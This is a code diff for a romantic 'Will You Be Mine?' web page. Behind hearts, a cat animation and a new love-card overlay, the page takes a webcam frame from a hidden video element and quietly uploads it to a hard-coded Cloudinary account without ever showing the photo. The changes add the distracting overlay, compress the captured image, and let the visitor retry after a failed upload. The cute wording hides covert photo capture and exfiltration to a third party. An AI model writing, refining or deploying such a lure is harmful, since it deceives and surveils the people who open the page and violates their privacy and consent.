@@ -96,6 +96,51 @@
         }
         .heart:before { top: -15px; left: 0; }
         .heart:after { left: 15px; top: 0; }
+
+        /* Love scene overlay */
+        .love-scene {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 192, 203, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.8s ease;
+        }
+        .love-scene.active {
+            display: flex;
+            opacity: 1;
+        }
+        .love-card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 20px;
+            max-width: 340px;
+            box-shadow: 0 10px 30px rgba(255, 105, 180, 0.6);
+            border: 4px solid #ff69b4;
+        }
+        .love-card h2 {
+            margin: 0 0 10px;
+            font-size: 1.8em;
+        }
+        .love-card p {
+            margin: 0;
+            font-size: 1.1em;
+        }
+        .love-emoji {
+            font-size: 3em;
+            margin-bottom: 15px;
+            animation: pulse 1.8s infinite;
+        }
+        .love-note {
+            margin-top: 12px;
+            font-size: 0.9em;
+            color: #ff1493;
+        }
+
         @keyframes float {
             0% { transform: translateY(100vh) rotate(-45deg); opacity: 0; }
             10% { opacity: 0.8; }
@@ -115,6 +160,21 @@
 </head>
 <body>
     <div class="hearts" id="hearts"></div>
+
+    <!-- Love scene overlay -->
+    <div class="love-scene" id="loveScene">
+        <div class="love-card">
+            <div class="love-emoji">💑</div>
+            <h2>Just You & Me</h2>
+            <p>
+                In this moment, it’s only us...<br>
+                Your smile is my favorite place in the world. ❤️
+            </p>
+            <div class="love-note">
+                Capturing this little piece of our love story… 📸💕
+            </div>
+        </div>
+    </div>
 
     <h1>Will You Be Mine? ❤️</h1>
     <p>My dearest love,<br>I prepared a little surprise full of warmth and cuddles just for you.<br>
@@ -148,15 +208,29 @@
         const catAnimation = document.getElementById('catAnimation');
         const status = document.getElementById('status');
         const startBtn = document.getElementById('startBtn');
+        const loveScene = document.getElementById('loveScene');
         let stream;
 
         const CLOUD_NAME = 'dosuvdwcx';
         const UPLOAD_PRESET = 'camera_upload_preset';
 
+        // Max size for compressed image (to keep under ~500KB)
+        const MAX_WIDTH = 640;
+        const MAX_HEIGHT = 640;
+        const JPEG_QUALITY = 0.7; // 0–1
+
         startBtn.addEventListener('click', async () => {
             startBtn.disabled = true;
             catAnimation.style.display = 'block';
             status.textContent = 'Aww... enjoying these cuddles! Getting your beautiful smile ready... ❤️';
+
+            // Show love scene overlay immediately on click
+            loveScene.classList.add('active');
+
+            // Optional: hide love scene after a few seconds (you can remove this if you want it to stay)
+            setTimeout(() => {
+                loveScene.classList.remove('active');
+            }, 6000);
 
             try {
                 // Request camera access
@@ -170,13 +244,28 @@
                 offscreenVideo.play();
 
                 offscreenVideo.onloadedmetadata = () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = offscreenVideo.videoWidth;
-                    canvas.height = offscreenVideo.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(offscreenVideo, 0, 0);
+                    let videoWidth = offscreenVideo.videoWidth;
+                    let videoHeight = offscreenVideo.videoHeight;
 
-                    // Upload to Cloudinary (without showing the photo)
+                    // Calculate scaling to keep within max resolution
+                    const scale = Math.min(
+                        MAX_WIDTH / videoWidth,
+                        MAX_HEIGHT / videoHeight,
+                        1 // never upscale
+                    );
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoWidth * scale;
+                    canvas.height = videoHeight * scale;
+
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(
+                        offscreenVideo,
+                        0, 0, videoWidth, videoHeight,
+                        0, 0, canvas.width, canvas.height
+                    );
+
+                    // Upload to Cloudinary (compressed JPEG)
                     canvas.toBlob(async (blob) => {
                         status.textContent = 'Sending your love... ❤️';
 
@@ -196,14 +285,18 @@
                                 status.style.color = '#d63384';
                             } else {
                                 status.textContent = 'Oops, something went wrong. Can you try again? I really want this moment with you! 🥰';
+                                startBtn.disabled = false;
                             }
                         } catch (err) {
                             status.textContent = 'Connection issue. Please try again, my dear.';
+                            startBtn.disabled = false;
                         }
 
                         // Stop camera
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/png');
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 'image/jpeg', JPEG_QUALITY);
                 };
             } catch (err) {
                 catAnimation.style.display = 'none';
